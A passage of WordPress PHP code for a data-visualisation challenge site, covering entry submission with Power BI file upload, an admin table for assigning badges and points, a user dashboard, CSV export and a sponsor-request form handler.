    global $wpdb;
    $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';

    $post_id = intval($_POST['post_id']);
    $user_id = get_current_user_id(); 



// Check challenge submission date
    $challenge_date = get_field('challenges_date', $post_id);
    if (empty($challenge_date)) {
        wp_send_json_error('Challenge date not set.');
        wp_die();
    }

    // Convert challenge date to timestamp (end of day, UK time)
    date_default_timezone_set('Europe/London');
    $challenge_date = str_replace("/", "-", $challenge_date); 
    $submission_timestamp = strtotime($challenge_date . ' 23:59');
    date_default_timezone_set('UTC'); // Reset to UTC

    // if (!$submission_timestamp) {
    //     wp_send_json_error('Invalid challenge date format.');
    //     wp_die();
    // }

    // Compare with current time
    $today_timestamp = time();
    if ($today_timestamp > $submission_timestamp) {
        wp_send_json_error('Submission closed. The challenge deadline has passed.');
        wp_die();
    }

    // Check if user has already submitted for this post
    $existing_entry = $wpdb->get_var(
        $wpdb->prepare(
            "SELECT COUNT(*) FROM $table_name WHERE user_id = %d AND post_id = %d",
            $user_id,
            $post_id
        )
    );

    if ($existing_entry > 0 ) {
        wp_send_json_error('You have already submitted an entry for this challenge.');
    }



    $fullname = sanitize_text_field($_POST['fullname_challenge']);
    $email = sanitize_email($_POST['email_challenge']);
    $linkedin_url = esc_url_raw($_POST['linkedin_url_challenge']);
    $profile_url = esc_url_raw($_POST['profile_url_challenge']);
   // $tool = sanitize_text_field($_POST['tool_challenge']);
    $rating = intval($_POST['rating_challenge']);
    $feedback = sanitize_textarea_field($_POST['feedback_challenge']);

    $powerbi_report_url = esc_url_raw($_POST['powerbi_report_url']);

    $portfolio_url = esc_url_raw($_POST['portfolio_url']);

   $visualisation_tools = isset($_POST['visualisation_tool_entry']) ? (array) $_POST['visualisation_tool_entry'] : array();
   $visualisation_tools = array_map('sanitize_text_field', $visualisation_tools); // Sanitize each value
    $tool_challenge = implode(', ', $visualisation_tools); 


    // Power BI Report File Handle
    $powerbi_report_file = '';
    if (!empty($_FILES['powerbi_report']['name'])) {
        $file = $_FILES['powerbi_report'];
        $max_size = 50 * 1024 * 1024; // 50 MB in bytes
        // File size check
        if ($file['size'] > $max_size) {
            wp_send_json_error('File size exceeds 50 MB limit. Please upload a smaller file.');
        }

        $allowed_types = array('pbix');
        $file_ext = pathinfo($file['name'], PATHINFO_EXTENSION);
        if (!in_array($file_ext, $allowed_types)) {
            wp_send_json_error('Invalid file type. Only .pbix files are allowed.');
        }
        $upload_dir = wp_upload_dir();
        $target_dir = $upload_dir['basedir'] . '/datadna-reports/';
        if (!file_exists($target_dir)) {
            wp_mkdir_p($target_dir);
        }
        $file_name = sanitize_file_name($user_id . '-' . time() . '-' . $file['name']);
        $target_file = $target_dir . $file_name;

        if (move_uploaded_file($file['tmp_name'], $target_file)) {
            $powerbi_report_file = $upload_dir['baseurl'] . '/datadna-reports/' . $file_name;
        } else {
        wp_send_json_error('Failed to upload Power BI report file.');
        }
    }
    // Prepare data for insertion
    $data = array(
        'post_id' => $post_id,
        'user_id' => $user_id,
        'fullname' => $fullname,
        'email' => $email,
        'linkedin_url' => $linkedin_url,
        'profile_url' => $profile_url,
        'tool' => $tool_challenge,
        'rating' => $rating,
        'points' => 0, // Default points
        'powerbi_report_file' => $powerbi_report_file, // File URL
        'powerbi_report_url' => $powerbi_report_url,
        'portfolio_url' => $portfolio_url, // Save portfolio URL
        'feedback' => $feedback,
        'created_at' => current_time('mysql'), // Timestamp
    );

    // Insert data into custom table
    $result = $wpdb->insert($table_name, $data);

    if ($result !== false) {

        //Adding a separate key for
        $user_participant_posts = get_user_meta($user_id, 'datadna_participant_posts', true);
             if (!is_array($user_participant_posts)) {
            $user_participant_posts = [];
             }

        // If user hasn't already been marked as a participant for this post
        if (!in_array($post_id, $user_participant_posts)) {
            $user_participant_posts[] = $post_id;
            update_user_meta($user_id, 'datadna_participant_posts', $user_participant_posts);

            // Add 10 points for this participant entry
          $existing_participant_points = (int) get_user_meta($user_id, 'datadna_participant_points', true);

           if ($existing_participant_points === '') {
            $existing_participant_points = 0; // Initialize if key doesn't exist
        }
            $new_participant_points = $existing_participant_points + 10;
            update_user_meta($user_id, 'datadna_participant_points', $new_participant_points);
        }

// Get post title for email
    $challenge_name = get_the_title($post_id);
    if (empty($challenge_name)) {
        $challenge_name = 'Challenge #' . $post_id; 
    }
         // Send email to admin
   // $admin_email = get_option('admin_email'); 

    $admin_email = [
        'leon@onyxdata.co.uk', 
        'jomari.escabosa@onyxdata.co.uk'];

    $subject = 'New Challenge Entry Received - ' . esc_html($challenge_name);
   
    $headers = array(
        'Content-Type: text/html; charset=UTF-8',
        'From: DataDNA <no-reply@datadna.onyxdata.co.uk>' 
    );

    // Prepare email body
    $message = '<!DOCTYPE html>';
    $message .= '<html><head><style>';
    $message .= 'table { border-collapse: collapse; font-family: Arial, sans-serif; }';
    $message .= 'th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }';
    $message .= 'th { background-color: #f5f5f5; }';
    $message .= 'a { color: #005A9C; text-decoration: underline; }';
    $message .= '</style></head><body>';
    $message .= '<h2>New DataDNA Challenge Submission</h2>';
    $message .= '<p>A new submission has been received from ' . esc_html($fullname) . '. Details below:</p>';
    $message .= '<table>';
    $message .= '<tr><th>Field</th><th>Value</th></tr>';

    $message .= '<tr><td><strong>Full Name</strong></td><td>' . esc_html($fullname) . '</td></tr>';
    $message .= '<tr><td><strong>Email</strong></td><td>' . esc_html($email) . '</td></tr>';
    $message .= '<tr><td><strong>Tools</strong></td><td>' . esc_html($tool_challenge ?: 'None selected') . '</td></tr>';
    $message .= '<tr><td><strong>Rating</strong></td><td>' . esc_html($rating) . '</td></tr>';
    $message .= '<tr><td><strong>Feedback</strong></td><td>' . esc_html($feedback ?: 'None') . '</td></tr>';
    $message .= '<tr><td><strong>LinkedIn URL</strong></td><td>' . ($linkedin_url ? '<a href="' . esc_url($linkedin_url) . '">' . esc_html($linkedin_url) . '</a>' : 'NA') . '</td></tr>';
    $message .= '<tr><td><strong>Profile URL</strong></td><td>' . ($profile_url ? '<a href="' . esc_url($profile_url) . '">' . esc_html($profile_url) . '</a>' : 'NA') . '</td></tr>';
   
    $message .='<tr><td><strong>Points</strong></td><td>10</td></tr>';
    $message .='<tr><td><strong>Badge</strong></td><td>None</td></tr>';

    $message .= '<tr><td><strong>Power BI Report</strong></td><td>' . ($powerbi_report_url ? '<a href="' . esc_url($powerbi_report_url) . '">' . esc_html($powerbi_report_url) . '</a>' : 'NA') . '</td></tr>';
    $message .= '<tr><td><strong>Portfolio URL</strong></td><td>' . ($portfolio_url ? '<a href="' . esc_url($portfolio_url) . '">' . esc_html($portfolio_url) . '</a>' : 'NA') . '</td></tr>';

    $message .= '<tr><td><strong>Submitted On</strong></td><td>' . esc_html($data['created_at']) . '</td></tr>';
    $message .= '</table>';
    $message .= '</body></html>';

    // Send email

    $mail_sent = wp_mail($admin_email, $subject, $message, $headers);
 
    if (!$mail_sent) {
        error_log('Failed to send DataDNA submission email to ' . $admin_email . ' at ' . current_time('mysql'));
    }

      wp_send_json_success(['message' => 'Data saved successfully']);
    } else {
        wp_send_json_error('Failed to save data: ' . $wpdb->last_error);
    }

    wp_die();
}

//Show table inside the post dashboard
add_action('add_meta_boxes', 'add_datadna_challenge_meta_box');
function add_datadna_challenge_meta_box() {
    add_meta_box(
        'datadna_challenge_meta_box',
        'Challenge Entries',
        'render_datadna_challenge_meta_box',
        'challenges',
        'normal',
        'high'
    );
}

// 

function render_datadna_challenge_meta_box($post) {
    global $wpdb;
    $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';

$entries_per_page = 20;
$current_page = isset($_GET['challenge_page']) ? max(1, intval($_GET['challenge_page'])) : 1;
$offset = ($current_page - 1) * $entries_per_page;

// Get total number of entries for this post
$total_entries = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM $table_name WHERE post_id = %d", $post->ID));

// Get paginated entries
$entries = $wpdb->get_results($wpdb->prepare(
    "SELECT * FROM $table_name WHERE post_id = %d LIMIT %d OFFSET %d",
    $post->ID, $entries_per_page, $offset
));


    $total_pages = ceil($total_entries / $entries_per_page);

    ?>
    <style>
        .challenge-table { width: 100%; border-collapse: collapse; background-color: white;}
        .challenge-table th, .challenge-table td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        .challenge-table th { background-color: #f2f2f2; }
        .challenge-table a { color: #0073aa; text-decoration: none; }
        .challenge-table a:hover { text-decoration: underline; }
        .edit-popup { 
            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); 
            z-index: 1000; max-width: 600px;width: 100%; 
        }
        .overlay { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.6); z-index: 999; 
        }
        .edit-popup h3 { margin: 0 0 15px; color: #333; font-size: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
        .edit-popup-form { display: flex; align-items: end; gap: 15px; }
        .edit-popup-form label { margin: 0; font-weight: bold; color: #555; }
        .edit-popup-form input[type="number"], .edit-popup-form select { 
            padding: 8px; font-size: 14px; border: 1px solid #ddd; border-radius: 4px; width: 100px; 
        }
        .edit-popup-form select { width: 300px; }
        .edit-popup-form button { 
            padding: 8px 15px; background: #0073aa; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; 
        }
        .edit-popup-form button:hover { background: #005177; }
        .edit-popup-form #close-popup { background: #dc3232; }
        .edit-popup-form #close-popup:hover { background: #b32d2e; }

    
        .meta-box-header { display: flex; justify-content: flex-end; margin-bottom: 15px; }
    .export-csv-btn { padding: 10px 20px; background: #2271b1; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
    .export-csv-btn:hover { background: #0863ad; }
    .edit-popup-form input[type="number"] { display: none; } /* Hide points input */

    .pagination {
    display: flex;
    flex-wrap: wrap;
    gap: 8px;
    justify-content: center;
    margin-top: 20px;
}

.pagination a {
    padding: 6px 12px;
    border: 1px solid #ddd;
    border-radius: 4px;
    text-decoration: none;
    color: #333;
    background-color: #f9f9f9;
    transition: all 0.2s;
}

.pagination a:hover {
    background-color: #e0e0e0;
    color: #000;
}

.pagination a[style*="font-weight:bold"] {
    background-color: #2271b1;
    color: white !important;
    font-weight: bold;
    border-color: #2271b1;
}
.loader-container {
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 30px 0;
}

.loader-container .spinner {
    border: 5px solid #f3f3f3;
    border-top: 5px solid #2271b1;
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 0.8s linear infinite;
    visibility: unset;
}

span.total-entries {
    margin: 10px 20px;
    font-size: 16px;
    font-weight: 600;
}
    
    @keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
    </style>

    <!-- Export CSV Button -->
    <div class="meta-box-header">
        <div>
            <label for="search-input-challenge" style="font-weight: bold; margin-right: 10px;">Search by Name:</label>
            <input type="text" id="search-input-challenge" placeholder="Enter atleast 3 letters..">
        </div>
        <div>
    <span class="total-entries">Total Submissions: <?php echo esc_html($total_entries); ?></span>
    <button class="export-csv-btn" onclick="window.location.href='<?php echo admin_url('admin-post.php?action=export_challenge_entries_csv&post_id=' . $post->ID); ?>'">
        Export to CSV
    </button>
   </div>
</div>

<div id="challenge-entries-wrapper">

    <table class="challenge-table">
        <thead>
            <tr><th class="counter">Serial No.</th>
                <th>User ID</th>
                <th>Full Name</th>
                <th>Email</th>
                <th>Tool</th>
                <th>Rating</th>
                <th>Feedback</th>
                <th>LinkedIn URL</th>
                <th>Profile URL</th>
                <th>Points</th>
                <th>Badge</th>
                <th>Power BI Report</th> <!-- New column -->
                <th>Portfolio url</th>
                <th>Submitted On</th>
                <th>Action</th>
            </tr>
        </thead>
        <tbody>
            <?php if (!empty($entries)) : $counter = 1; ?>
                <?php foreach ($entries as $entry) : 
                   // echo '<pre>';print_r($entries);
                    ?>
                    <tr data-entry-id="<?php echo $entry->id; ?>">
                        <td class="counter"><?php echo $counter++; ?></td>
                        <td><?php echo esc_html($entry->user_id); ?></td>
                        <td><?php echo esc_html($entry->fullname); ?></td>
                        <td><?php echo esc_html($entry->email); ?></td>
                        <td><?php echo esc_html($entry->tool); ?></td>
                        <td><?php echo esc_html($entry->rating); ?></td>
                        <td><?php echo esc_html($entry->feedback); ?></td>
                        <td><?php if ($entry->linkedin_url) : ?><a href="<?php echo esc_url($entry->linkedin_url); ?>" target="_blank">View URL</a><?php else : ?>N/A<?php endif; ?></td>
                        <td><?php if ($entry->profile_url) : ?><a href="<?php echo esc_url($entry->profile_url); ?>" target="_blank">View URL</a><?php else : ?>N/A<?php endif; ?></td>
                        <td class="points-cell"><?php echo esc_html($entry->points); ?></td>
                        <td><?php echo esc_html($entry->badges ?: 'None'); ?></td>
                      <td>
                            <?php
                            $report_links = array();
                            if ($entry->powerbi_report_file) {
                                $report_links[] = '<a href="' . esc_url($entry->powerbi_report_file) . '" target="_blank">Download Report</a>';
                            }
                            if ($entry->powerbi_report_url) {
                                $report_links[] = '<a href="' . esc_url($entry->powerbi_report_url) . '" target="_blank">View Report</a>';
                            }
                            echo !empty($report_links) ? implode(' | ', $report_links) : 'N/A';
                            ?>
                        </td>
                           <td><?php if ($entry->portfolio_url) { ?><a href="<?php echo esc_url($entry->portfolio_url); ?>" target="_blank">View Portfolio</a><?php }else { ?>None<?php } ?></td> 

                        <td><?php echo esc_html($entry->created_at); ?></td>
                        <td>
                            <button type="button" class="edit-entry" data-entry-id="<?php echo $entry->id; ?>" 
                                    data-points="<?php echo esc_attr($entry->points); ?>" 
                                    data-badges="<?php echo esc_attr($entry->badges); ?>">
                                Edit
                            </button>
                        </td>
                    </tr>
                <?php endforeach; ?>
            <?php else : ?>
                <tr><td colspan="13">No entries yet.</td></tr>
            <?php endif; ?>
        </tbody>
    </table>

     <?php if ($total_pages > 1) : ?>
        <div class="pagination" style="margin-top: 20px; display: flex; gap: 8px; flex-wrap: wrap;">
            <?php for ($i = 1; $i <= $total_pages; $i++) : 
                $url = '#'; // Change to prevent full page reload
                $active = ($i === $current_page) ? 'style="font-weight:bold;color:#2271b1;"' : '';
            ?>
                <a href="#" class="ajax-page-link" data-page="<?php echo $i; ?>" <?php echo $active; ?>><?php echo $i; ?></a>
            <?php endfor; ?>
        </div>
    <?php endif; ?>

</div>

    <!-- Popup -->
    <div class="overlay"></div>
    <div class="edit-popup" id="edit-popup">
        <form id="edit-entry-form" onsubmit="return false;">
            <h3>Allocate points and badge to user:</h3>
            <div class="edit-popup-form">
                <!--<label>Points: <input type="number" id="popup-points" name="popup_points" min="0"></label>-->
                <label>Badges: 
                    <select id="popup-badges" name="popup_badges">
                        <option value="">None(Participant)</option>
                        <option value="Winner">Winner (100 points)</option>
                        <option value="Runner Up">Runner Up (50 points)</option>
                        <option value="ZoomCharts Mini Challenge - Winner">ZoomCharts Mini Challenge - Winner (100 points)</option>
                        <option value="ZoomCharts Mini Challenge - Top 5">ZoomCharts Mini Challenge - Top 5 (50 points)</option>
                        <option value="The Creative Head">The Creative Head (30 points)</option>
                        <option value="The Storyteller">The Storyteller (30 points)</option>
                        <option value="The Problem Solver">The Problem Solver (30 points)</option>
                        <option value="The Accessibility">The Accessibility (30 points)</option>
                        <!-- <option value="Participant">Participant (10 points)</option> -->

                        
                    </select>
                </label>
                <button type="button" id="save-popup">Save</button>
                <button type="button" id="close-popup">Close</button>
                
                <div id="popup-loader" style=" display:none; text-align:center;margin-top: 10px;">
    
                 <div class="spinner1" style="width: 30px;align-items: center;height: 30px;border-top: 2px solid #ffbb09;border-radius: 50%;animation: spin 1s linear infinite;"></div>
                </div>
                
            </div>
            <input type="hidden" id="popup-entry-id" name="entry_id">
        </form>
    </div>

    <script>
        jQuery(document).ready(function($) {
           // $('.edit-entry').on('click', function(e) {
            $(document).on('click', '.edit-entry', function(e) {
                e.preventDefault();
                var entryId = $(this).data('entry-id');
               // var points = $(this).data('points');
                var badges = $(this).data('badges');

                $('#popup-entry-id').val(entryId);
                //$('#popup-points').val(points);
                $('#popup-badges').val(badges);

                $('.overlay, #edit-popup').show();
            });

            $('#close-popup').on('click', function(e) {
                e.preventDefault();
                $('.overlay, #edit-popup').hide();
            });

            $('#popup-points').on('click focus', function(e) {
                e.preventDefault();
            });

            $('#save-popup').on('click', function(e) {
                e.preventDefault();
                var entryId = $('#popup-entry-id').val();
               // var points = $('#popup-points').val();
                var badges = $('#popup-badges').val();
                
                  $('#popup-loader').show();
                $('#save-popup') .prop('disabled', true);

                $.ajax({
                    url: ajax_object.ajax_url,
                    type: 'POST',
                    data: {
                        action: 'save_challenge_entry_points_badges',
                        entry_id: entryId,
                        //points: points,
                        badges: badges,
                        post_id: ajax_object.post_id,
                       // nonce: ajax_object.nonce
                    },
                    dataType: 'json',
                    success: function(response) {
                        console.log(response);
                        if (response.success) {
                            alert('Entry updated successfully!');
                              $('#popup-loader').hide();
                              $('#save-popup') .prop('disabled', false);
                            $('.overlay, #edit-popup').hide();
                            
                            $('tr[data-entry-id="' + entryId + '"] .points-cell').text(response.data.points);
                            $('tr[data-entry-id="' + entryId + '"] td:nth-child(11)').text(response.data.badges || 'None'); // Badge update
                                        //location.reload(); 
                        } else {
                            alert('Error: ' + response.data);
                            $('#save-popup') .prop('disabled', false);
                        }
                    },
                    
                    error: function(xhr) {
                        alert('An error occurred: ' + xhr.responseText);
                        $('#save-popup') .prop('disabled', false);
                    },
                    complete: function () {
            // Hide loader regardless of success/error
            $('#popup-loader').hide();
            $('#save-popup') .prop('disabled', false);
        }
                });
            });
        });
    </script>
    <?php
}


 //add_action('wp_ajax_save_challenge_entry_points_badges', 'save_challenge_entry_points_badges');

// function save_challenge_entry_points_badges() {

//     if (!current_user_can('edit_posts')) {
//         wp_send_json_error('Permission denied.');
//     }

//     global $wpdb;
//     $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';

//     $entry_id = intval($_POST['entry_id']);
//     //$points = intval($_POST['points']);
//     $badges = sanitize_text_field($_POST['badges']);
//     $post_id = intval($_POST['post_id']);

//         $badge_points = [
//         'Winner' => 100,
//         'Runner Up' => 50,
//         'ZoomCharts Mini Challenge - Winner' => 100,
//         'ZoomCharts Mini Challenge - Top 5' => 50,
//         'The Creative Head' => 30,
//         'The Storyteller' => 30,
//         'The Problem Solver' => 30,
//         'The Accessibility' => 30,
//         'Participant' => 10,
//         '' => 0, // None
//     ];
//     // Get points based on selected badge
//     $points = isset($badge_points[$badges]) ? $badge_points[$badges] : 0;
    
//     if ($existing_points === 0) {
//         $existing_points = 10; // Default 10 points for each new entry
//     }

//     $total_points = $existing_points + $points;
//     // Get the existing badge for this entry (before updating)
//     $existing_badge = $wpdb->get_var($wpdb->prepare(
//         "SELECT badges FROM $table_name WHERE id = %d",
//         $entry_id
//     ));
   
//     $result = $wpdb->update(
//         $table_name,
//         array(
//             'points' => $total_points,
//             'badges' => $badges 
//         ),
//         array('id' => $entry_id),
//         array('%d', '%s'),
//         array('%d')
//     );

//     if ($result !== false) {
//         $user_id = $wpdb->get_var($wpdb->prepare("SELECT user_id FROM $table_name WHERE id = %d", $entry_id));

//         $total_user_points = $wpdb->get_var($wpdb->prepare("SELECT SUM(points) FROM $table_name WHERE user_id = %d", $user_id));
//         update_user_meta($user_id, 'datadna_total_points', $total_user_points);

//         $existing_badges = get_user_meta($user_id, 'datadna_user_badges', true);
//         if (!is_array($existing_badges)) {
//             $existing_badges = array();
//         }
        
//        // Update badges for this specific post
//         if ($badges) {
//             $existing_badges[$post_id] = $badges; // Set or update the badge for this post
//         } else {
//             unset($existing_badges[$post_id]); // Remove the badge for this post if "None" is selected
//         }

//         // Update the user meta with the modified badges array
//         update_user_meta($user_id, 'datadna_user_badges', $existing_badges);

//         wp_send_json_success(['points' => $points,
//                               'badges' => $badges]);
//     } else {
//         wp_send_json_error('Failed to update entry.');
//     }

//     wp_die();
// }

//yesterday night last code
// add_action('wp_ajax_save_challenge_entry_points_badges', 'save_challenge_entry_points_badges');
// function save_challenge_entry_points_badges() {
//     if (!current_user_can('edit_posts')) {
//         wp_send_json_error('Permission denied.');
//     }

//     global $wpdb;
//     $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';

//     $entry_id = intval($_POST['entry_id']);
//     $new_badge = sanitize_text_field($_POST['badges']);
//     $post_id = intval($_POST['post_id']);

//     $badge_points = [
//         'Winner' => 100,
//         'Runner Up' => 50,
//         'ZoomCharts Mini Challenge - Winner' => 100,
//         'ZoomCharts Mini Challenge - Top 5' => 50,
//         'The Creative Head' => 30,
//         'The Storyteller' => 30,
//         'The Problem Solver' => 30,
//         'The Accessibility' => 30,
//         'Participant' => 10,
//     ];

//     $user_id = $wpdb->get_var($wpdb->prepare("SELECT user_id FROM $table_name WHERE id = %d", $entry_id));

//     // Get current points of this entry
//     $existing_entry = $wpdb->get_row($wpdb->prepare("SELECT points, badges FROM $table_name WHERE id = %d", $entry_id));
//     $existing_points = intval($existing_entry->points);
//     $existing_badges = maybe_unserialize($existing_entry->badges);

//     if (!is_array($existing_badges)) {
//         $existing_badges = [];
//     }

//     // Ensure 'Participant' badge is always included
//     if (!in_array('Participant', $existing_badges)) {
//         $existing_badges[] = 'Participant';
//         $existing_points += 10;
//     }

//     // Add new badge if not already there
//     if ($new_badge && $new_badge !== 'Participant' && !in_array($new_badge, $existing_badges)) {
//         $existing_badges[] = $new_badge;
//         $badge_points_to_add = $badge_points[$new_badge] ?? 0;
//         $existing_points += $badge_points_to_add;
//     }

//     // Save updated entry
//     $wpdb->update(
//         $table_name,
//         array(
//             'points' => $existing_points,
//             'badges' => maybe_serialize($existing_badges)
//         ),
//         array('id' => $entry_id),
//         array('%d', '%s'),
//         array('%d')
//     );

//     // Update user total points across all entries
//     $total_user_points = $wpdb->get_var($wpdb->prepare("SELECT SUM(points) FROM $table_name WHERE user_id = %d", $user_id));
//     update_user_meta($user_id, 'datadna_total_points', $total_user_points);

//     // Update user badge meta (store by post ID)
//     $user_badge_meta = get_user_meta($user_id, 'datadna_user_badges', true);
//     if (!is_array($user_badge_meta)) {
//         $user_badge_meta = [];
//     }

//     $user_badge_meta[$post_id] = $existing_badges;
//     update_user_meta($user_id, 'datadna_user_badges', $user_badge_meta);

//     wp_send_json_success([
//         'points' => $existing_points,
//         'badges' => $existing_badges,
//     ]);

//     wp_die();
// }

add_action('wp_ajax_save_challenge_entry_points_badges', 'save_challenge_entry_points_badges');

function save_challenge_entry_points_badges() {

    if (!current_user_can('edit_posts')) {
        wp_send_json_error('Permission denied.');
    }

    global $wpdb;
    $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';

    $entry_id = intval($_POST['entry_id']);
    //$points = intval($_POST['points']);
    $badges = sanitize_text_field($_POST['badges']);
    $post_id = intval($_POST['post_id']);

        $badge_points = [
        'Winner' => 100,
        'Runner Up' => 50,
        'ZoomCharts Mini Challenge - Winner' => 100,
        'ZoomCharts Mini Challenge - Top 5' => 50,
        'The Creative Head' => 30,
        'The Storyteller' => 30,
        'The Problem Solver' => 30,
        'The Accessibility' => 30,
        'Participant' => 10,
        '' => 0, // None
    ];
    // Get points based on selected badge
$points = isset($badge_points[$badges]) ? $badge_points[$badges] : 0;
    
    if ($existing_points === 0) {
        $existing_points = 10; // Default 10 points for each new entry
    }

    $total_points = $existing_points + $points;
    // Get the existing badge for this entry (before updating)
    $existing_badge = $wpdb->get_var($wpdb->prepare(
        "SELECT badges FROM $table_name WHERE id = %d",
        $entry_id
    ));
   
    $result = $wpdb->update(
        $table_name,
        array(
            'points' => $total_points,
            'badges' => $badges 
        ),
        array('id' => $entry_id),
        array('%d', '%s'),
        array('%d')
    );

    if ($result !== false) {
        $user_id = $wpdb->get_var($wpdb->prepare("SELECT user_id FROM $table_name WHERE id = %d", $entry_id));

        $total_user_points = $wpdb->get_var($wpdb->prepare("SELECT SUM(points) FROM $table_name WHERE user_id = %d", $user_id));
        update_user_meta($user_id, 'datadna_total_points', $total_user_points);

        $existing_badges = get_user_meta($user_id, 'datadna_user_badges', true);
        if (!is_array($existing_badges)) {
            $existing_badges = array();
        }
        
       // Update badges for this specific post
        if ($badges) {
            $existing_badges[$post_id] = $badges; // Set or update the badge for this post
        } else {
            unset($existing_badges[$post_id]); // Remove the badge for this post if "None" is selected
        }

        // Update the user meta with the modified badges array
        update_user_meta($user_id, 'datadna_user_badges', $existing_badges);

        wp_send_json_success(['points' => $points,
                              'badges' => $badges]);
    } else {
        wp_send_json_error('Failed to update entry.');
    }

    wp_die();
}

function datadna_user_dashboard_shortcode() {
    if (!is_user_logged_in()) return '<p>Please log in to see your dashboard.</p>';

    $user_id = get_current_user_id();
    $total_points = get_user_meta($user_id, 'datadna_total_points', true) ?: 0;
    $badges = get_user_meta($user_id, 'datadna_user_badges', true) ?: array();

    global $wpdb;
    $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';
    $entries = $wpdb->get_results($wpdb->prepare("SELECT post_id, points, badges, powerbi_report_file, powerbi_report_url, created_at FROM $table_name WHERE user_id = %d", $user_id));

    $output = '';
    $output .= '<style> table tr:first-child td{color: #212529;background: #fff;font-size:15px;font-family: Arial, sans-serif;
    font-weight: 500;}</style>
    <h3>Your Challenge Dashboard</h3>';
    $output .= '<table style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">';
    $output .= '<thead><tr style="background: #f2f2f2;"><th style="border: 1px solid #ddd; padding: 8px;">Challenge</th><th style="border: 1px solid #ddd; padding: 8px;">Received Points</th><th style="border: 1px solid #ddd; padding: 8px;">Badge</th><th style="border: 1px solid #ddd; padding: 8px;">Report</th><th style="border: 1px solid #ddd; padding: 8px;">Submitted On</th></tr></thead>';
    $output .= '<tbody>';
    if (!empty($entries)) {
        foreach ($entries as $entry) {
            $output .= '<tr>';
            $output .= '<td style="border: 1px solid #ddd; padding: 8px;">' . esc_html(get_the_title($entry->post_id)) . '</td>';
            $output .= '<td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($entry->points) . '</td>';
            $output .= '<td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($entry->badges ?: 'None') . '</td>';
            $output .= '<td style="border: 1px solid #ddd; padding: 8px;">';
            $report_links = array();
            if ($entry->powerbi_report_file) {
                $report_links[] = '<a href="' . esc_url($entry->powerbi_report_file) . '" target="_blank">Download Report</a>';
            }
            if ($entry->powerbi_report_url) {
                $report_links[] = '<a href="' . esc_url($entry->powerbi_report_url) . '" target="_blank">View Report</a>';
            }
            $output .= !empty($report_links) ? implode(' | ', $report_links) : 'N/A';
            $output .= '</td>';
            $output .= '<td style="border: 1px solid #ddd; padding: 8px;">' . esc_html($entry->created_at) . '</td>';
            $output .= '</tr>';
        }
    } else {
        $output .= '<tr><td colspan="5" style="border: 1px solid #ddd; padding: 8px;">No entries yet.</td></tr>';
    }
    $output .= '</tbody></table>';


    

    return $output;
}
add_shortcode('datadna_dashboard', 'datadna_user_dashboard_shortcode');


//Csv export function 
add_action('admin_post_export_challenge_entries_csv', 'export_challenge_entries_csv');
function export_challenge_entries_csv() {
    if (!current_user_can('edit_posts')) {
        wp_die('Permission denied.');
    }

    $post_id = isset($_GET['post_id']) ? intval($_GET['post_id']) : 0;
    if (!$post_id) {
        wp_die('Invalid post ID.');
    }

    global $wpdb;
    $table_name = $wpdb->prefix . 'datadna_challenges_entry_data';
    $entries = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE post_id = %d", $post_id));

    if (empty($entries)) {
        wp_die('No entries to export.');
    }

    // CSV headers set karo
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="challenge_entries_' . $post_id . '_' . date('Y-m-d_H-i-s') . '.csv"');
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Pragma: no-cache');
    header('Expires: 0');

    // Output buffer open and write csv
    $output = fopen('php://output', 'w');

    // Column headers add
    $headers = array(
        'User ID',
        'Full Name',
        'Email',
        'Tool',
        'Rating',
        'Feedback',
        'LinkedIn URL',
        'Profile URL',
        'Points',
        'Badge',
        'Power BI Report File',
        'Power BI Report URL',
        'Portfolio url',
        'Submitted On'
    );
    fputcsv($output, $headers);

    // Each entry in CSV 
    foreach ($entries as $entry) {
        $row = array(
            $entry->user_id,
            $entry->fullname,
            $entry->email,
            $entry->tool,
            $entry->rating,
            $entry->feedback,
            $entry->linkedin_url,
            $entry->profile_url,
            $entry->points,
            $entry->badges ?: 'None',
            $entry->powerbi_report_file,
            $entry->powerbi_report_url,
            $entry->portfolio_url,
            $entry->created_at
        );
        fputcsv($output, $row);
    }

    fclose($output);
    exit;
}




add_action('wp_ajax_handle_sponsor_request', 'handle_sponsor_request');
add_action('wp_ajax_nopriv_handle_sponsor_request', 'handle_sponsor_request');

function handle_sponsor_request() {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        wp_send_json_error('Invalid request method.');
    }

    $name = isset($_POST['sponsor_name']) ? sanitize_text_field($_POST['sponsor_name']) : '';
    $email = isset($_POST['sponsor_email']) ? sanitize_email($_POST['sponsor_email']) : '';
    $company = isset($_POST['company_name']) ? sanitize_text_field($_POST['company_name']) : '';

    if (empty($name) || empty($email) || empty($company)) {
        wp_send_json_error('Please fill out all required fields.');
    }

    if (!is_email($email)) {
        wp_send_json_error('Invalid email address.');
    }

    $client_email = 'leon@onyxdata.co.uk';
   // $client_email = 'chetanc.stevesailab@gmail.com';

    // Email subject and message
    $subject = 'New Sponsor Request from ' . $name;
    $message = "A new sponsor request has been submitted:\n\n";
    $message .= "Name: $name\n";
    $message .= "Email: $email\n";
    $message .= "Company Name: $company\n";
    $headers = array('Content-Type: text/plain; charset=UTF-8','Reply-To: ' . $email );

    $mail_sent = wp_mail($client_email, $subject, $message, $headers);

    if ($mail_sent) {
